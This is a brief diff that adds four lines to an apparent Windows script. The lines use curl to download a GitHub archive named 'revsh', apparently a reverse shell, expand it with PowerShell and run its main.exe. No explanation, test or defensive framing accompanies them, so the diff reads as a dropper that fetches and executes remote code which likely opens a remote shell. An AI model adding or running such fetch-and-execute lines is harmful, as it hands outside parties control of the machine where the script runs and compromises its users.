@@ -1,0 +1,4 @@
+curl -L -o revsh.zip https://github.com/miguelzacca/revsh/archive/refs/heads/main.zip
+powershell -Command "Expand-Archive -Path 'revsh.zip' -DestinationPath '.'"
+cd revsh-main
+main.exe
